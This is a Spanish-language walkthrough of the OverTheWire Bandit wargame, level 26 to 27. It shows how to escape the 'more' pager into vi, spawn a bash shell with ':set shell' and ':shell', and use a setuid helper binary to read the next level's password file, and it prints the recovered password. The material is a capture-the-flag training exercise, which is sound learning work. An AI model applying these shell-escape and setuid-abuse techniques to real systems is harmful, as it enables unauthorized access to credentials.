## Objetivo

Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de Acceso al Nivel

ssh bandit26@bandit.labs.overthewire.org -p 2220

## Solucion

```
:set shell=/bin/bash

:shell
bandit26@bandit:~$ ls -la
total 44
drwxr-xr-x  3 root     root      4096 Jul 17 15:57 .
drwxr-xr-x 70 root     root      4096 Jul 17 15:58 ..
-rwsr-x---  1 bandit27 bandit26 14880 Jul 17 15:57 bandit27-do
-rw-r--r--  1 root     root       220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root     root      3771 Mar 31 08:41 .bashrc
-rw-r--r--  1 root     root       807 Mar 31 08:41 .profile
drwxr-xr-x  2 root     root      4096 Jul 17 15:57 .ssh
-rw-r-----  1 bandit26 bandit26   258 Jul 17 15:57 text.txt
bandit26@bandit:~$ ./
bash: ./: Is a directory
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
bandit26@bandit:~$
```

## Notas Adicionales

Hacer que se trabe el more con la tecnica infalible, despues pones la letra v para entrar en vi, despues ponemos el siguiente comando para salir al bash

:set shell=/bin/bash

:shell

con el bandit27-do podemos ejecutar comandos a ese nombre y asi sacamos la contraseña

## Referencias